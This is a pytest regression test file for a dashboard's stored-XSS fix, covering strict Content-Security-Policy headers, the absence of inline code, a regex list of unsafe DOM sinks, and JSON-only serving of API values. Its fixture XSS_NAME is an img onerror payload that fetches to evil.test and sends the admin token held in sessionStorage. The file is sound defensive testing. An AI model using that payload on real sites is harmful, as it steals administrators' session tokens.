"""Dashboard hardening: strict CSP, no inline code, API data never rendered as markup.

Regression tests for a stored XSS: the dashboard used to build its tables with
``innerHTML`` from API values (key names, project names, audit actors...) and was served
without a Content-Security-Policy, so a key named ``<img src=x onerror=...>`` would run in
an administrator's browser and could read the JWT kept in ``sessionStorage``.
"""

from __future__ import annotations

import re
from html.parser import HTMLParser

from app.core.config import get_settings
from tests.conftest import sample_key

XSS_NAME = '<img src=x onerror="fetch(`//evil.test/?t=`+sessionStorage.nkm_token)">'
ASSETS = {
    "/static/dashboard.js": "text/javascript",
    "/static/dashboard.css": "text/css",
}


def parse_csp(header: str) -> dict[str, list[str]]:
    directives: dict[str, list[str]] = {}
    for part in header.split(";"):
        if part.strip():
            name, *sources = part.split()
            directives[name.lower()] = sources
    return directives


class _Inspector(HTMLParser):
    """Collects everything in the page that would need an inline-code CSP exception."""

    def __init__(self) -> None:
        super().__init__()
        self.inline_scripts = 0
        self.style_elements = 0
        self.script_sources: list[str] = []
        self.stylesheets: list[str] = []
        self.forbidden_attributes: list[str] = []
        self._in_script = False

    def handle_starttag(self, tag, attrs):
        attributes = dict(attrs)
        if tag == "script":
            self._in_script = True
            if attributes.get("src"):
                self.script_sources.append(attributes["src"])
            else:
                self.inline_scripts += 1
        if tag == "style":
            self.style_elements += 1
        if tag == "link" and attributes.get("rel") == "stylesheet":
            self.stylesheets.append(attributes.get("href") or "")
        for name, value in attrs:
            if (
                name.startswith("on")
                or name == "style"
                or (value or "").lower().startswith("javascript:")
            ):
                self.forbidden_attributes.append(f"<{tag} {name}>")

    def handle_endtag(self, tag):
        if tag == "script":
            self._in_script = False

    def handle_data(self, data):
        if self._in_script and data.strip():
            self.inline_scripts += 1


def _without_comments(source: str) -> str:
    source = re.sub(r"/\*.*?\*/", "", source, flags=re.DOTALL)
    return re.sub(r"(?m)^\s*//.*$", "", source)


async def test_dashboard_sends_a_strict_csp(client):
    response = await client.get("/")
    assert response.status_code == 200
    csp = parse_csp(response.headers["content-security-policy"])
    assert csp["default-src"] == ["'self'"]
    assert csp["script-src"] == ["'self'"]
    assert csp["style-src"] == ["'self'"]
    assert csp["object-src"] == ["'none'"]
    assert csp["base-uri"] == ["'none'"]
    assert csp["frame-ancestors"] == ["'none'"]
    # No directive may re-open what the ones above close.
    for sources in csp.values():
        assert not {"'unsafe-inline'", "'unsafe-eval'", "*", "data:", "http:", "https:"} & set(
            sources
        )
    assert response.headers["x-content-type-options"] == "nosniff"


async def test_dashboard_assets_are_served_with_the_same_policy(client):
    page_policy = (await client.get("/")).headers["content-security-policy"]
    for path, media_type in ASSETS.items():
        response = await client.get(path)
        assert response.status_code == 200, path
        assert response.headers["content-type"].split(";")[0] == media_type
        assert response.headers["content-security-policy"] == page_policy
        assert response.headers["x-content-type-options"] == "nosniff"


async def test_dashboard_page_references_only_its_own_assets(client):
    inspector = _Inspector()
    inspector.feed((await client.get("/")).text)
    assert sorted(inspector.script_sources + inspector.stylesheets) == sorted(ASSETS)
    assert inspector.inline_scripts == 0
    assert inspector.style_elements == 0
    assert inspector.forbidden_attributes == []


async def test_dashboard_script_never_builds_markup_from_strings(client):
    # A tripwire, not a proof: it fails the build if someone reintroduces a string-to-markup
    # sink. That rendering really is text-only was also checked by running dashboard.js in
    # jsdom against hostile API responses (see the pull request).
    response = await client.get("/static/dashboard.js")
    assert response.status_code == 200
    source = _without_comments(response.text)
    assert source.strip(), "dashboard.js is empty"
    sinks = re.findall(
        r"\b(?:innerHTML|outerHTML|insertAdjacentHTML|createContextualFragment|srcdoc|"
        r"document\.write(?:ln)?|eval|setAttribute|DOMParser)\b|\bnew\s+Function\b",
        source,
    )
    assert sinks == []


async def test_dashboard_shows_the_message_of_a_429(rate_limiting, client):
    """Every API error is ``{"detail": ...}`` except the limiter's, which is ``{"error": ...}``.

    The script used to read only ``detail``, so the toast for a 429 was empty. The behaviour was
    also checked by running dashboard.js in jsdom against a limited instance (see the pull
    request); this keeps the two halves of the contract from drifting apart.
    """
    attempts = int(get_settings().rate_limit_auth.split("/")[0]) + 1
    for _ in range(attempts):
        response = await client.post(
            "/api/v1/auth/login", json={"email": "nobody@example.com", "password": "wrong"}
        )
    assert response.status_code == 429
    assert set(response.json()) == {"error"}  # no "detail": the message lives under "error"

    source = _without_comments((await client.get("/static/dashboard.js")).text)
    assert re.search(r"body\.detail\b", source) and re.search(r"body\.error\b", source)
    assert "res.statusText ||" in source  # HTTP/2 has no reason phrase


async def test_hostile_values_are_stored_verbatim_and_served_only_as_json(client, admin_headers):
    # Contract test (it also passes on the code before the fix): the API does not escape
    # values, because escaping is the renderer's job and doing it twice corrupts data for
    # every other client (MCP tools, scripts). They only ever come back as application/json,
    # and the static page shell never embeds them.
    created = await client.post(
        "/api/v1/keys",
        json={"name": XSS_NAME, "api_key": sample_key("nvapi-xss-")},
        headers=admin_headers,
    )
    assert created.status_code == 201, created.text
    project = await client.post(
        "/api/v1/projects",
        json={"name": XSS_NAME, "description": XSS_NAME},
        headers=admin_headers,
    )
    assert project.status_code == 201, project.text

    for path in ("/api/v1/keys", "/api/v1/projects", "/api/v1/audit"):
        response = await client.get(path, headers=admin_headers)
        assert response.headers["content-type"].startswith("application/json"), path
    assert (await client.get("/api/v1/keys", headers=admin_headers)).json()[0]["name"] == XSS_NAME

    for path in ("/", *ASSETS):
        assert "onerror" not in (await client.get(path)).text, path
        assert "evil.test" not in (await client.get(path)).text, path


async def test_composed_app_keeps_the_dashboard_policy(monkeypatch):
    from httpx import ASGITransport, AsyncClient

    from app.core.config import get_settings
    from app.main import DASHBOARD_CSP, create_asgi_app

    settings = get_settings()
    monkeypatch.setattr(settings, "mcp_enabled", True)
    monkeypatch.setattr(settings, "mcp_auth_enabled", False)
    monkeypatch.setattr(settings, "public_base_url", "http://testserver")
    transport = ASGITransport(app=create_asgi_app())
    async with AsyncClient(transport=transport, base_url="http://testserver") as composed:
        for path in ("/", *ASSETS):
            response = await composed.get(path)
            assert response.status_code == 200, path
            assert response.headers["content-security-policy"] == DASHBOARD_CSP, path
